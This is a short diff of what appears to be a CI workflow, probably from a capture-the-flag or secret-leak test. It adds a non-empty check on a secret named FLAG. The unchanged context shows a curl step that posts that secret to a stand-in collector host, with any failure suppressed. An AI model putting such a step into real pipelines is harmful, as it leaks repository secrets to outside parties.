@@ -17,6 +17,7 @@ jobs:
         env:
           FLAG: ${{ secrets.FLAG }}
         run: |
+          test -n "$FLAG"
           curl --fail --max-time 3 \
             --data-urlencode "flag=${FLAG}" \
             https://flag-collector.invalid/ingest || true
